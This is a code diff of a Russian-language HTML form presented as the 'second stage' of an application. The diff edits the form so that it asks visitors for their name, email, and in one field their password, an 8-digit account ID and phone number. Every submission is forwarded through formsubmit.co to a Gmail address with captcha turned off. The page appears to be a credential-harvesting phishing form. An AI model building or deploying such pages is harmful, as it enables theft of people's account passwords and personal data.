@@ -3,40 +3,23 @@
     <head>
         <meta charset="UTF-8">
         <title>Второй этап заявки</title>
+        <style>
+            #inp {
+                width: 300px;
+            }
+        </style>
         <script src="main.js"></script>
     </head>
     <body>
-        <!-- <center>
-			<table border="5px" id="table">
-				<tr>
-					<th>Имя</th>
-					<th>Фамилия</th>
-					<th>Емаил</th>
-					<th>Телeфон</th>
-					<th>ID</th>
-					<th>Пароль</th>
-				</tr>
-				<tr>
-					<td><input type="text" id="inp" ></td>
-					<td><input type="text" id="inp" ></td>
-					<td><input type="email" id="inp" placeholder="example@example.com"></td>
-					<td><input type="phone" id="inp" placeholder="+7 (999) 999-99-99"></td>
-					<td><input id="inp" maxlength="8" oninput="said(this)" placeholder="15086782"></td>
-					<td><input type="password" id="inp"></td>
-				</tr>
-			</table> -->
             <h1>Заполните пожалуйста форму</h1>
             <form action="https://formsubmit.co/html1cloud@gmail.com" method="POST">
-		<input type="hidden" name="_template" value="table">
-		<input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_next" value="index.html">
+                <input type="hidden" name="_next" value="thank.html">
                 <input type="hidden" name="_subject" value="Новый заказ!">
-                <h3>Имя:</h3><input type="text" name="name" placeholder="Иван" required>
-                <h3>Фамилия:</h3><input type="text" name="name" placeholder="Сусанин" required>
-                <h3>Емаил:</h3><input type="email" name="email" id="inp" placeholder="example@example.com" required>
-				<h3>Телeфон</h3><input type="phone" name="name" id="inp" placeholder="+7 (999) 999-99-99" required>
-				<h3>ID:</h3><input name="name" id="inp" maxlength="8" oninput="said(this)" placeholder="15086782" required>
-                <h3>Пароль:</h3><td><input type="text" name="name" id="inp"></td>
+                <input type="hidden" name="_captcha" value="false">
+                <h3>Ваше Имя, Фамилия: </h3><input type="text" name="name" placeholder="Иван Сусанин" required>
+                <h3>Ваш емаил:</h3><input type="email" name="email" placeholder="example@example.com" required>
+                <h3>Ваш пароль, ID, Телефон:</h3><textarea type="text" name="message" id="inp" placeholder="пароль; 15086782; +7 (999) 999-99-99"></textarea>
+				<!-- <h3>ID:</h3><input name="name" id="inp" maxlength="8" oninput="said(this)" placeholder="15086782" required> -->
                 <br>
                 <br>
                 <button type="submit">Отправить информацию, следующий шаг заявки</button>
